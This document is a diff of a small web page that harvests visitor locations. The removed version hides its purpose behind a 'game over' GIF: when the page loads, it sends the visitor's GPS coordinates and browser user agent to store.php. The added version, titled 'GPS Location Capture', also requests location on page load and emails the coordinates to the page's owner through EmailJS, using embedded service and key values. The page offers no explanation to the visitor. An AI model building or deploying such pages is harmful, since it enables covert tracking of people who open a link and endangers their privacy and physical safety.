@@ -1,32 +1,66 @@
-xml
 <!DOCTYPE html>
-<html>
-<body onload="getLocation()">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GPS Location Capture</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+    <h1>GPS Location Capture</h1>
 
-<iframe src="https://giphy.com/embed/RHEGP4TpkhrQTFCZE4" 
-      width="480" height="427" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-<p><a href="https://giphy.com/gifs/hancholodesigns-game-over-gameover-ring-RHEGP4TpkhrQTFCZE4"></a></p>
+    <script>
+        (function() {
+            emailjs.init("ySwKe-Vy0vc89yhaW"); // Replace with your EmailJS public key
+        })();
 
-<p id="demo"></p>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
 
-<script>
-const x = document.getElementById("demo");
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
+            const templateParams = {
+                latitude: lat,
+                longitude: lng,
+                to_name: 'Recipient Name', // Change as needed
+                from_name: 'Your Name', // Change as needed
+                message: 'Here is my GPS location.'
+            };
 
-function showPosition(position) {
-    const xhttp = new XMLHttpRequest();
-    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude +
-              "&uagent=" + encodeURIComponent(navigator.userAgent), true);
-    xhttp.send();
-}
-</script>
+            emailjs.send('service_79zgaqg', 'template_56xx4ux', templateParams)
+                .then((response) => {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, (error) => {
+                    console.error('FAILED...', error);
+                });
+        }
 
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.error("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        // Automatically call getLocation when the page loads
+        window.onload = getLocation;
+    </script>
 </body>
 </html>
